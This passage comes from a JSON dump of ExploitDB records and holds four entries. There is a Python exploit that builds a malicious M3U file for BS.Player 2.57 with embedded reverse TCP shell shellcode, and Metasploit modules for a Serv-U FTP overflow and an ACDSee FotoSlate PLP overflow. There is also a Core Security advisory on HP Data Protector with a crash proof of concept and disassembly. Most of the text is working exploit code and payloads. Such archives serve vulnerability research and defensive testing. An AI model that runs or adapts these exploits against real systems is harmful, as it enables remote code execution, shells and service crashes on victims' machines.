                "code": "#\r\n#\r\n#[+]Exploit Title: Exploit Buffer Overfloe Bsplayer 2.57(UNICODE-SEH)\r\n#[+]Date: 01\\07\\2010\r\n#[+]Author: C4SS!0 G0M3S\r\n#[+]Software Link: http://www.bsplayer.com/services/downlad-free-bsplayer.php?type=2\r\n#[+]Version: 2.57\r\n#[+]Tested on: WIN-XP SP3 PORTUGUESE BRAZILIAN\r\n#[+]CVE: N/A\r\n#\r\n#\r\n#  #########      ##   #########      #########  ##     ###############\r\n#  #########    ####   #########      #########  ##     ##           ##    \r\n#  ##         ## ##    ##             ##         ##     ##           ## \r\n#  ##        ##  ##    ##             ##         ##     ##           ##\r\n#  ##       ########## ########       ########   ##     ##           ##\r\n#  ##            ##          ##             ##   ##     ##           ##\r\n#  ##            ##          ##             ##   ##     ##           ##\r\n#  ########      ##    ########      #########   ##     ##           ##\r\n#  ########      ##    ########      #########   \\/     ###############\r\n#                                              \r\n#Created By C4SS!0 G0M3S\r\n#Louredo_@hotmail.com\r\n#www.invasao.com.br\r\n#\r\n#\r\n\r\n\r\nimport os\r\nimport sys\r\nimport time\r\nimport string\r\n\r\nos.system(\"cls\")\r\nos.system(\"color 4f\")\r\n\r\ndef usage():\r\n        print \"\\n\"\r\n        print \"[+]Exploit: Exploit Buffer Overflow Bsplayer(UNICODE-SEH)\"\r\n        print \"[+]Date: 01\\\\07\\\\2010\"\r\n        print \"[+]Author: C4SS!0 G0M3S\"\r\n        print \"[+]Home: www.invasao.com.br\"\r\n        print \"[+]E-mail: Louredo_@hotmail.com\"\r\n        print \"[+]Version: 2.57\"\r\n        print \"[+]Software: Bsplayer 2.57\\n\"\r\n        print \"[-]Note:\"\r\n        print \"TO EXPLOIT THE RUN FILE NAME MUST BE FILE_NAME.M3U\\n\"\r\n\r\n\r\nif((len(sys.argv)!=3) or (int(sys.argv[1])<1) or (int(sys.argv[1])>2)):\r\n        usage()\r\n        print \"Payloads:\\n1 - WinExec(\\\"Calc.exe\\\",0)\\n2 - Reverse_Tcp_Shell\\n\"\r\n        print \"[-]Usage: \"+sys.argv[0]+\" <Playload Number> <File Name>\"\r\n        print \"[-]Exemple: \"+sys.argv[0]+\" 1 Exploit.m3u\"\r\n        sys.exit(0)\r\n\r\nusage()\r\nbuffer = \"\\x42\" * 4102\r\nnseh = \"\\x61\\x6d\"\r\nseh = \"\\xde\\x4e\" #pop ebx - pop ebp - ret at 0x004E00DE [bsplayer.exe]\r\negg_hunter = \"\\x45\\x61\\x45\\x61\\x45\\x50\\x45\\xc3\"\r\n\r\njunk = \"\\x45\" * 1094\r\nprint \"[*]Identifying the length Shellcode\"\r\ntime.sleep(1)\r\nif int(sys.argv[1]) == 2:\r\n\tshellcode = (\"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZ\"\r\n\t\"ABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBNKWY7N4PV9X6PQX1PV9JYNZ9SDMTZTR\" # \r\n\t\"83SY0KT01RPLLLCBPLLT2RLPJX9KKTOX3NZUKKV0VLK3Y3MLRONMMJU2VWC8VQKQSOPTZT3CTK1LPUR6\" #\r\n\t\"KZR65RJC7NPWDLVRZQUMFMV85BXR7BOG8SCKUNXUVMVGIPMKJJZ6XSQ40ORI2UTOWNWRXVF679XJWYPL\" #FROM METASPLOIT FRAMEWORK \r\n\t\"OU2QOXQNN0GGLNM3HJLRVWUSKO4OWMVOZKXLKLY2B3U1BQMPEBVMQEEFULKP12N8GHWH43CROTS2NPPD\" #\r\n\t\"QT0YXLS5MOM3OCKSRWPFLJWWN19PSXXOFKYD7KLN3WYMFFEJY7LO785W6C1TM7MOURUH7EOM1FZTEMOJ\" #SHELLCODE REVERSE_TCP_SHELL ON PORT 4444\r\n\t\"28TUN2LK0SKNTKKPHJSDRKLFONNC2620QXQTRFZUE3UGR8TOL5V3YO47PRSMMBURNNL9MNEHNELX5NOW\" #\r\n\t\"Q8C5UPOLK3BIRSQBOXVDD9STOI8LHBM1Y3PEPOKMQOMKRN8JZIJ3MPJ0VRRYY92VP0DLVJ3TVJFWKSKB\" #PROMPT:\r\n\t\"QCMXW7O30CRZRF7JK7JV4S2SRM9M5RRTOZZVFYQQDKKW1LY7S6LZFJLLZNXMJB685QOJGLNKNITOCZSK\" #\r\n\t\"QITVVPONFL6LN0O1RVBINM6OLML4XL0TNL6RRVN28UOKSULQJXYLLY9NLM57LVDS8NY2PMQ3MORRMHQD\" #C:\\>Telnet 127.0.0.1 4444\r\n\t\"BEINV9QY8U0MN1ZTUPPO3KGMVDOQWLNEUOJLWKE6UPNMBX12QURRNVJN78DYMXKOMHNA\")            # \r\n                                                                                       #\r\nif int(sys.argv[1]) == 1:\r\n        shellcode = (\"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZ\"\r\n        \"ABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBIKY0NQ99GO3LLVRPHLXY2TMTL46QMNR\"\r\n        \"8P1SHN853YXKLKSSHQXL4TENPSHWL3599RX6VNCJUKCH4VNSMM25ZOJP2MLWORBZMMM1DJ5QVO9MQ9W4\"\r\n        \"V30ZUBQWZLFP5KELTXGCLKKMKLE2KZPNG9MOXKMNBNXMKVBK893KGOKSJXOPLPOMS8SR3UTPWKGHXOKT\"\r\n        \"CDN4CMOQG1C34R171NSXML5WVKE7QSN4XL5VJZQM5W8O669OMOK90J9KN0Q31VVLNNOCUN957X7SHNOP\"\r\n        \"YTP3KXWLE3O9XCKXJA\")\r\n\r\nprint \"[*]The Length Shellcode:\"+str(len(shellcode))\r\n\r\ntime.sleep(1)\r\n\r\nshellcode += \"\\x41\" * 5000\r\n\r\nfile = str(sys.argv[2])\r\n\r\npayload = buffer+nseh+seh+egg_hunter+junk+shellcode\r\n\r\nop = \"w\"\r\nprint \"[*]Creating Your File \"+file\r\ntime.sleep(1)\r\ntry:\r\n        f = open(file,op)\r\n        f.write(\"http://\"+payload)\r\n        f.close()\r\n        print \"[*]The File \"+file+\" was Successfully Created\"\r\nexcept:\r\n        print \"[*]Error Creating File \"+file",
                "description": "BS.Player 2.57 - Local Buffer Overflow (SEH Unicode)",
                "author": "C4SS!0 G0M3S",
                "_id": 15934,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-01-07T00:00:00+00:00",
                "cve": [],
                "type": "local",
                "port": 0
            },
            {
                "code": "##\r\n# $Id$\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = NormalRanking\r\n\r\n\tinclude Msf::Exploit::Remote::Egghunter\r\n\tinclude Msf::Exploit::Remote::Ftp\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => 'Serv-U FTP Server <4.2 Buffer Overflow',\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\tThis module exploits a stack buffer overflow in the site chmod command\r\n\t\t\t\tin versions of Serv-U FTP Server prior to 4.2.\r\n\r\n\t\t\t\tYou must have valid credentials to trigger this vulnerability. Exploitation\r\n\t\t\t\talso leaves the service in a non-functional state.\r\n\t\t\t},\r\n\t\t\t'Author'         => 'thelightcosine <thelightcosine[at]metasploit.com>',\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Version'        => '$Revision$',\r\n\t\t\t'References'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'CVE', '2004-2111'],\r\n\t\t\t\t\t[ 'BID', '9483'],\r\n\t\t\t\t],\r\n\t\t\t'Privileged'     => true,\r\n\t\t\t'DefaultOptions' =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'EXITFUNC' => 'thread',\r\n\t\t\t\t},\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'BadChars'    => \"\\x00\\x7e\\x2b\\x26\\x3d\\x25\\x3a\\x22\\x0a\\x0d\\x20\\x2f\\x5c\\x2e\",\r\n\t\t\t\t\t'DisableNops' => true,\r\n\t\t\t\t},\r\n\t\t\t'Platform'       => 'win',\r\n\t\t\t'Targets'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'Windows 2000 SP0-4 EN', {\r\n\t\t\t\t\t\t'Ret'    => 0x750212bc, #WS2HELP.DLL\r\n\t\t\t\t\t\t'Offset' => 396 } ],\r\n\t\t\t\t\t[ 'Windows XP SP0-1 EN', {\r\n\t\t\t\t\t\t'Ret'    => 0x71aa388f, #WS2HELP.DLL\r\n\t\t\t\t\t\t'Offset' => 394 } ]\r\n\t\t\t\t],\r\n\t\t\t'DisclosureDate' => 'Dec 31 2004',\r\n\t\t\t'DefaultTarget'  => 0))\r\n\tend\r\n\r\n\tdef check\r\n\t\tconnect\r\n\t\tdisconnect\r\n\r\n\t\tif (banner =~ /Serv-U FTP Server v((4.(0|1))|3.\\d)/)\r\n\t\t\treturn Exploit::CheckCode::Vulnerable\r\n\t\tend\r\n\t\t\treturn Exploit::CheckCode::Safe\r\n\tend\r\n\r\n\r\n\tdef exploit\r\n\t\tconnect_login\r\n\r\n\t\teggoptions =\r\n\t\t{\r\n\t\t\t:checksum => true,\r\n\t\t\t:eggtag => \"W00T\"\r\n\t\t}\r\n\r\n\t\thunter,egg = generate_egghunter(payload.encoded,payload_badchars,eggoptions)\r\n\r\n\r\n\t\tbuffer = \"chmod 777 \"\r\n\t\tbuffer <<  make_nops(target['Offset'] - egg.length - hunter.length)\r\n\t\tbuffer << egg\r\n\t\tbuffer << hunter\r\n\t\tbuffer << \"\\xeb\\xc9\\x41\\x41\"\t#nseh, jump back to egghunter\r\n\t\tbuffer << [target.ret].pack('V')\t#seh\r\n\t\tbuffer << rand_text(5000)\r\n\r\n\t\tprint_status(\"Trying target #{target.name}...\")\r\n\r\n\t\tsend_cmd( ['SITE', buffer] , false)\r\n\r\n\t\thandler\r\n\t\tdisconnect\r\n\tend\r\n\r\nend",
                "description": "RhinoSoft Serv-U FTPd Server < 4.2 - Remote Buffer Overflow (Metasploit)",
                "author": "Metasploit",
                "_id": 18190,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-12-02T00:00:00+00:00",
                "cve": [],
                "type": "remote",
                "port": 0
            },
            {
                "code": "-----BEGIN PGP SIGNED MESSAGE-----\r\nHash: SHA1\r\n\r\n  Core Security Technologies - Corelabs Advisory\r\n       http://corelabs.coresecurity.com/\r\n\r\n  HP Data Protector EXEC_CMD Buffer Overflow Vulnerability\r\n\r\n\r\n1. *Advisory Information*\r\n\r\nTitle: HP Data Protector EXEC_CMD Buffer Overflow Vulnerability\r\nAdvisory ID: CORE-2011-0606\r\nAdvisory URL:\r\nhttp://www.coresecurity.com/content/HP-Data-Protector-EXECCMD-Vulnerability\r\nDate published: 2011-06-29\r\nDate of last update: 2011-06-29\r\nVendors contacted: HP\r\nRelease mode: Coordinated release\r\n\r\n\r\n2. *Vulnerability Information*\r\n\r\nClass: Remote stack overflow [CWE-120]\r\nImpact: Code execution\r\nRemotely Exploitable: Yes\r\nLocally Exploitable: No\r\nCVE Name: CVE-2011-1866\r\n\r\n\r\n3. *Vulnerability Description*\r\n\r\nHP Data Protector [1] is an automated backup and recovery software for\r\nsingle-server to enterprise environments. A vulnerability in HP Data\r\nProtector could allow a remote attacker to execute arbitrary code. The\r\nvulnerability is triggered by sending a request to port 5555 of a host\r\nrunning the \"data protector inet\" service, part of HP Data Protector.\r\n\r\n\r\n4. *Vulnerable packages*\r\n\r\n   . HP OpenView Storage Data Protector v6.20 (running on Windows).\r\n   . HP OpenView Storage Data Protector v6.11 (running on Windows).\r\n   . HP OpenView Storage Data Protector v6.10 (running on Windows).\r\n   . HP OpenView Storage Data Protector v6.00 (running on Windows).\r\n   . Previous versions may be affected, but were not tested.\r\n\r\n\r\n5. *Non-vulnerable packages*\r\n\r\n   . No fixes are available at the time of publication.\r\n\r\n\r\n6. *Vendor Information, Solutions and Workarounds*\r\n\r\nHP has issued a security bulletin with document ID c02872182 [2]\r\navailable through HP Support Center at http://www.hp.com/go/HPSC.\r\n\r\nThe latest version of HP Data Protector is vulnerable to this issue. HP\r\nhas provided the following procedure to mitigate this vulnerability:\r\n\r\n   1. Upgrade to Data Protector A.06.20 or subsequent.\r\n   2. Enable encrypted control communication services on cell server and\r\nall clients in cell.\r\n\r\n The upgrade is available for download from\r\nhttp://hp.com/go/dataprotector then under 'Product Information' click on\r\n'Trials and Demos'.\r\n\r\n\r\n7. *Credits*\r\n\r\nThis vulnerability was discovered and researched by Nahuel C. Riva from\r\nCore Security Technologies. Publication was coordinated by Carlos Sarraute.\r\n\r\n\r\n8. *Technical Description / Proof of Concept Code*\r\n\r\nThe following python script can be used to reproduce the bug.\r\n\r\n/-----\r\nimport sys\r\nimport socket\r\n\r\nfrom struct import pack\r\n\r\nip = sys.argv[1]\r\nport = int(sys.argv[2]) # default tcp port 5555\r\n\r\ntarget = (ip, port)\r\n\r\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\ns.connect(target)\r\n\r\npath = 'A' * 5000\r\n\r\npacket =  pack('<L', 0x20003220)\r\npacket += pack('<L', 0x00302000)\r\npacket += '\\x20'\r\npacket += pack('>H', 0x0020)\r\npacket += pack('<L', 0x00432000)\r\npacket += pack('<L', 0x00303220)\r\npacket += '\\x20'\r\npacket += 'omnicheck.exe'\r\npacket += pack('>H', 0x0020)\r\npacket += pack('>H', 0x0020) * 4\r\npacket += pack('<L', 0x30200030)\r\npacket += pack('>H', 0x0020)\r\npacket += path\r\npacket += pack('>H', 0x0000)\r\n\r\nplen = pack('>L', len(packet))\r\n\r\ns.send(plen + packet)\r\n\r\n- -----/\r\n By executing this script, the omniinet.exe process crashes in the\r\nfollowing EIP:\r\n\r\n/-----\r\n7C8285D3    8B0424           MOV EAX,DWORD PTR SS:[ESP]\r\n7C8285D6    8BE5             MOV ESP,EBP\r\n7C8285D8    5D               POP EBP\r\n7C8285D9    C3               RETN\r\n        \r\n- -----/\r\n This is part of a function inside the ntdll.dll library, however, if we\r\nlook the SEH chain, we can see that the SEH handler was overwritten with\r\nthe value 0x00410041 (the unicode value for \"AA\"):\r\n\r\n/-----\r\nSEH chain of thread 00000578\r\nAddress    SE handler\r\n009AFF94   omniinet.00410041\r\n00410041   A3004472\r\n        \r\n- -----/\r\n The following are the values of the CPU registers at the time of the\r\ncrash:\r\n\r\n/-----\r\nEAX C0000008\r\nECX 009AEC98\r\nEDX 7C82859C ntdll.KiRaiseUserExceptionDispatcher\r\nEBX 0015B480\r\nESP 009AEC44\r\nEBP 009AEC94\r\nESI 00155A80\r\nEDI 00000000\r\nEIP 7C8285D3 ntdll.7C8285D3\r\nC 0  ES 0023 32bit 0(FFFFFFFF)\r\nP 1  CS 001B 32bit 0(FFFFFFFF)\r\nA 0  SS 0023 32bit 0(FFFFFFFF)\r\nZ 0  DS 0023 32bit 0(FFFFFFFF)\r\nS 0  FS 003B 32bit 7FFDB000(FFF)\r\nT 0  GS 0000 NULL\r\nD 0\r\nO 0  LastErr ERROR_SUCCESS (00000000)\r\nEFL 00000206 (NO,NB,NE,A,NS,PE,GE,G)\r\nST0 empty 0.0\r\nST1 empty 0.0\r\nST2 empty 0.0\r\nST3 empty 0.0\r\nST4 empty 0.0\r\nST5 empty 0.0\r\nST6 empty 0.7610000000000000098\r\nST7 empty 1.0000000000000000000\r\n               3 2 1 0      E S P U O Z D I\r\nFST 4020  Cond 1 0 0 0  Err 0 0 1 0 0 0 0 0  (EQ)\r\nFCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1\r\n        \r\n- -----/\r\n The problem is in the 0041D170 function. This function does a blind\r\ncopy of the string passed in the packet as a path:\r\n\r\n/-----\r\n0041D170     /$ 55             PUSH EBP\r\n0041D171     |. 8BEC           MOV EBP,ESP\r\n0041D173     |. 51             PUSH ECX\r\n0041D174     |. 8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]\r\n0041D177     |. 8945 FC        MOV DWORD PTR SS:[EBP-4],EAX\r\n0041D17A     |. 8B4D 08        MOV ECX,DWORD PTR SS:[EBP+8]\r\n0041D17D     |. 0FB711         MOVZX EDX,WORD PTR DS:[ECX]\r\n0041D180     |. 85D2           TEST EDX,EDX\r\n0041D182     |. 74 73          JE SHORT omniinet.0041D1F7\r\n[...]\r\n0041D1F7     |> 8B45 0C        /MOV EAX,DWORD PTR SS:[EBP+C]\r\n0041D1FA     |. 0FB708         |MOVZX ECX,WORD PTR DS:[EAX]\r\n0041D1FD     |. 85C9           |TEST ECX,ECX\r\n0041D1FF     |. 74 26          |JE SHORT omniinet.0041D227\r\n0041D201     |. 8B55 08        |MOV EDX,DWORD PTR SS:[EBP+8]\r\n0041D204     |. 8955 FC        |MOV DWORD PTR SS:[EBP-4],EDX\r\n0041D207     |. 8B45 08        |MOV EAX,DWORD PTR SS:[EBP+8]\r\n0041D20A     |. 8B4D 0C        |MOV ECX,DWORD PTR SS:[EBP+C]\r\n0041D20D     |. 66:8B11        |MOV DX,WORD PTR DS:[ECX]\r\n0041D210     |. 66:8910        |MOV WORD PTR DS:[EAX],DX // copy WORDs\r\nto the stack\r\n0041D213     |. 8B45 08        |MOV EAX,DWORD PTR SS:[EBP+8]\r\n0041D216     |. 83C0 02        |ADD EAX,2\r\n0041D219     |. 8945 08        |MOV DWORD PTR SS:[EBP+8],EAX\r\n0041D21C     |. 8B4D 0C        |MOV ECX,DWORD PTR SS:[EBP+C]\r\n0041D21F     |. 83C1 02        |ADD ECX,2\r\n0041D222     |. 894D 0C        |MOV DWORD PTR SS:[EBP+C],ECX\r\n0041D225     |.^EB D0          \\JMP SHORT omniinet.0041D1F7\r\n0041D227     |> 8B55 08        MOV EDX,DWORD PTR SS:[EBP+8]\r\n0041D22A     |. 66:C702 0000   MOV WORD PTR DS:[EDX],0\r\n0041D22F     |. 8B45 FC        MOV EAX,DWORD PTR SS:[EBP-4]\r\n0041D232     |. 8BE5           MOV ESP,EBP\r\n0041D234     |. 5D             POP EBP\r\n0041D235     \\. C3             RETN\r\n        \r\n- -----/\r\n\r\n\r\n\r\n9. *Report Timeline*\r\n\r\n. 2011-06-06:\r\nCore Security Technologies notifies the HP team of the vulnerabilities\r\nand provides the technical details. Publication date is temporarily set\r\nto July 5th, 2011.\r\n\r\n. 2011-06-06:\r\nVendor confirms that a new case was assigned within HP Software Security\r\nResponse Team (SSRT).\r\n\r\n. 2011-06-16:\r\nCore requests an update on this issue, in particular Core asks the\r\nvendor for a technical analysis of the bugs, a list of affected products\r\nand versions, and the vendor's plan for providing a fix (no reply\r\nreceived).\r\n\r\n. 2011-06-23:\r\nCore requests once more an update.\r\n\r\n. 2011-06-28:\r\nVendor communicates that a security bulletin will be issued on the same\r\nday (June 28). The vendor confirms the vulnerabilities, and recommends\r\nas mitigation to enable encrypted communications in the cell server and\r\nclient.\r\n\r\n. 2011-06-28:\r\nCore requests a link to the vendor's bulletin, and asks whether CVE ids\r\nhave been assigned.\r\n\r\n. 2011-06-28:\r\nVendor provides a link to the bulletin and CVE names for the\r\nvulnerabilities.\r\n\r\n. 2011-06-29:\r\nAdvisory CORE-2011-0606 is published.\r\n\r\n\r\n\r\n10. *References*\r\n\r\n[1] HP Data Protector http://hp.com/go/dataprotector\r\n[2] HPSBMU02686 SSRT100541 rev.2 - HP OpenView Storage Data Protector,\r\nRemote Execution of Arbitrary Code\r\nhttp://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02872182\r\n\r\n\r\n11. *About CoreLabs*\r\n\r\nCoreLabs, the research center of Core Security Technologies, is charged\r\nwith anticipating the future needs and requirements for information\r\nsecurity technologies. We conduct our research in several important\r\nareas of computer security including system vulnerabilities, cyber\r\nattack planning and simulation, source code auditing, and cryptography.\r\nOur results include problem formalization, identification of\r\nvulnerabilities, novel solutions and prototypes for new technologies.\r\nCoreLabs regularly publishes security advisories, technical papers,\r\nproject information and shared software tools for public use at:\r\nhttp://corelabs.coresecurity.com.\r\n\r\n\r\n12. *About Core Security Technologies*\r\n\r\nCore Security Technologies enables organizations to get ahead of threats\r\nwith security test and measurement solutions that continuously identify\r\nand demonstrate real-world exposures to their most critical assets. Our\r\ncustomers can gain real visibility into their security standing, real\r\nvalidation of their security controls, and real metrics to more\r\neffectively secure their organizations.\r\n\r\nCore Security's software solutions build on over a decade of trusted\r\nresearch and leading-edge threat expertise from the company's Security\r\nConsulting Services, CoreLabs and Engineering groups. Core Security\r\nTechnologies can be reached at +1 (617) 399-6980 or on the Web at:\r\nhttp://www.coresecurity.com.\r\n\r\n\r\n13. *Disclaimer*\r\n\r\nThe contents of this advisory are copyright (c) 2011 Core Security\r\nTechnologies and (c) 2011 CoreLabs, and are licensed under a Creative\r\nCommons Attribution Non-Commercial Share-Alike 3.0 (United States)\r\nLicense: http://creativecommons.org/licenses/by-nc-sa/3.0/us/\r\n\r\n\r\n14. *PGP/GPG Keys*\r\n\r\nThis advisory has been signed with the GPG key of Core Security\r\nTechnologies advisories team, which is available for download at\r\nhttp://www.coresecurity.com/files/attachments/core_security_advisories.asc.\r\n-----BEGIN PGP SIGNATURE-----\r\nVersion: GnuPG v1.4.9 (MingW32)\r\n\r\niEYEARECAAYFAk4LnZsACgkQyNibggitWa07/ACfSlzkBvbowAskeP/K4FqtxCay\r\nEAkAnRCPKdc35t5Cb0ZJbGy4me4JRALo\r\n=zHon\r\n-----END PGP SIGNATURE-----",
                "description": "HP Data Protector 6.20 - EXEC_CMD Buffer Overflow",
                "author": "Core Security",
                "_id": 17461,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-06-30T00:00:00+00:00",
                "cve": [
                    "CVE-2011-1866"
                ],
                "type": "dos",
                "port": 0
            },
            {
                "code": "##\r\n# $Id: acdsee_fotoslate_string.rb 13853 2011-10-10 16:47:33Z sinn3r $\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = GoodRanking\r\n\r\n\tinclude Msf::Exploit::FILEFORMAT\r\n\tinclude Msf::Exploit::Remote::Seh\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => 'ACDSee FotoSlate PLP File id Parameter Overflow',\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\t\tThis module exploits a buffer overflow in ACDSee FotoSlate 4.0 Build 146 via\r\n\t\t\t\ta specially crafted id parameter in a String element.  When viewing a malicious\r\n\t\t\t\tPLP file with the ACDSee FotoSlate product, a remote attacker could overflow a\r\n\t\t\t\tbuffer and execute arbitrary code. This exploit has been tested on systems such as\r\n\t\t\t\tWindows XP SP3, Windows Vista, and Windows 7.\r\n\t\t\t},\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Author'         =>\r\n\t\t\t\t[\r\n\t\t\t\t\t'Parvez Anwar', # Vulnerability discovery\r\n\t\t\t\t\t'juan vazquez'  # Metasploit module\r\n\t\t\t\t],\r\n\t\t\t'Version'        => '$Revision: 13853 $',\r\n\t\t\t'References'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'CVE', '2011-2595' ],\r\n\t\t\t\t\t[ 'OSVDB', '75425' ],\r\n\t\t\t\t\t[ 'BID', '49558' ],\r\n\t\t\t\t],\r\n\t\t\t'DefaultOptions' =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'EXITFUNC' => 'process',\r\n\t\t\t\t\t'DisablePayloadHandler' => 'true'\r\n\t\t\t\t},\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t#'Space'    => 4000,\r\n\t\t\t\t\t'BadChars' => \"\\x00\\x22\"\r\n\t\t\t\t},\r\n\t\t\t'Platform' => 'win',\r\n\t\t\t'Targets'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t'ACDSee FotoSlate 4.0 Build 146',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t'Ret'         => 0x263a5b57, # pop, pop, ret from ipwssl6.dll\r\n\t\t\t\t\t\t\t'Offset'      => 1812,\r\n\t\t\t\t\t\t\t'TotalLength' => 5000\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t],\r\n\t\t\t\t],\r\n\t\t\t'Privileged'     => false,\r\n\t\t\t'DisclosureDate' => 'Sep 12 2011',\r\n\t\t\t'DefaultTarget'  => 0))\r\n\r\n\t\tregister_options(\r\n\t\t\t[\r\n\t\t\t\tOptString.new('FILENAME', [ true, 'The file name.',  'msf.plp']),\r\n\t\t\t], self.class)\r\n\tend\r\n\r\n\tdef exploit\r\n\r\n\t\toverflow = rand_text(target[\"Offset\"])\r\n\t\toverflow << generate_seh_record(target.ret)\r\n\t\toverflow << payload.encoded\r\n\t\toverflow << rand_text_alpha(target[\"TotalLength\"] - overflow.length)\r\n\r\n\t\tplp =<<TEMPLATE\r\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n<ACDFotoSlateDocument15>\r\n<PageDefinition>\r\n<Template>\r\n<Version>3.0</Version>\r\n<Page>\r\n<Name>Letter</Name>\r\n<Properties>\r\n<String id=\"#{overflow}\"></String>\r\n<String id=\"Width\">8.500000IN</String>\r\n<String id=\"Height\">11.000000IN</String>\r\n<String id=\"Orientation\">Portrait</String>\r\n<Bool id=\"AutoRotate\">FALSE</Bool>\r\n<Bool id=\"AutoFill\">FALSE</Bool>\r\n</Properties>\r\n<Content>\r\n<Bool id=\"UseBGColor\">FALSE</Bool>\r\n<Int id=\"BGImageType\">0</Int>\r\n<String id=\"BGImageFile\"></String>\r\n<Int id=\"BGColor\">16777215</Int>\r\n</Content>\r\n</Page>\r\n<ToolList>\r\n<Group>\r\n<Tool>\r\n<Name>Image</Name>\r\n<Properties>\r\n<String id=\"XPos\">0.500000IN</String>\r\n<String id=\"YPos\">0.500000IN</String>\r\n<String id=\"Width\">7.500000IN</String>\r\n<String id=\"Height\">10.000000IN</String>\r\n<Float id=\"Tilt\">0.000000</Float>\r\n</Properties>\r\n<Content>\r\n<Int id=\"ShapeType\">0</Int>\r\n<Float id=\"RoundRectX\">0.000000</Float>\r\n<Float id=\"RoundRectY\">0.000000</Float>\r\n<Bool id=\"ShrinkToFit\">FALSE</Bool>\r\n<Bool id=\"AutoRotate\">FALSE</Bool>\r\n<Float id=\"BorderWidth\">0.000000</Float>\r\n<Bool id=\"UseBGColor\">FALSE</Bool>\r\n<Int id=\"BGColor\">8454143</Int>\r\n<Bool id=\"DropShadow\">FALSE</Bool>\r\n<Int id=\"DSColor\">0</Int>\r\n<Bool id=\"BevelEdge\">FALSE</Bool>\r\n<Bool id=\"Border\">FALSE</Bool>\r\n<Int id=\"BorderColor\">16711680</Int>\r\n<Bool id=\"IsLocked\">FALSE</Bool>\r\n</Content>\r\n</Tool>\r\n</Group>\r\n</ToolList>\r\n</Template>\r\n<PageContent>\r\n<Version>3.0</Version>\r\n<Page>\r\n<Name>Letter</Name>\r\n<Content>\r\n<Bool id=\"UseBGColor\">FALSE</Bool>\r\n<Int id=\"BGImageType\">0</Int>\r\n<String id=\"BGImageFile\"></String>\r\n<Int id=\"BGColor\">16777215</Int>\r\n</Content>\r\n</Page>\r\n<ToolList>\r\n<Group>\r\n<Tool>\r\n<Name>Image</Name>\r\n<Content>\r\n<Int id=\"ShapeType\">0</Int>\r\n<Float id=\"RoundRectX\">0.000000</Float>\r\n<Float id=\"RoundRectY\">0.000000</Float>\r\n<Bool id=\"ShrinkToFit\">FALSE</Bool>\r\n<Bool id=\"AutoRotate\">FALSE</Bool>\r\n<Float id=\"BorderWidth\">0.000000</Float>\r\n<Bool id=\"UseBGColor\">FALSE</Bool>\r\n<Int id=\"BGColor\">8454143</Int>\r\n<Bool id=\"DropShadow\">FALSE</Bool>\r\n<Int id=\"DSColor\">0</Int>\r\n<Bool id=\"BevelEdge\">FALSE</Bool>\r\n<Bool id=\"Border\">FALSE</Bool>\r\n<Int id=\"BorderColor\">16711680</Int>\r\n<Bool id=\"IsLocked\">FALSE</Bool>\r\n</Content>\r\n</Tool>\r\n</Group>\r\n</ToolList>\r\n</PageContent>\r\n</PageDefinition>\r\n</ACDFotoSlateDocument15>\r\nTEMPLATE\r\n\r\n\t\tprint_status(\"Creating '#{datastore['FILENAME']}' file ...\")\r\n\t\tfile_create(plp)\r\n\tend\r\n\r\nend\r\n\r\n\r\n=begin\r\nAfter SEH, we have ~0x23C3 bytes (9155 in decimal) of space for payload. But we need to avoid\r\nusing a long buffer in order to avoid the meterpreter possibly being broken.\r\n=end",
                "description": "ACDSee FotoSlate - '.PLP' File 'id' Local Overflow (Metasploit)",
                "author": "Metasploit",
                "_id": 17966,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-10-10T00:00:00+00:00",
                "cve": [],
                "type": "local",
                "port": 0
            },
            {
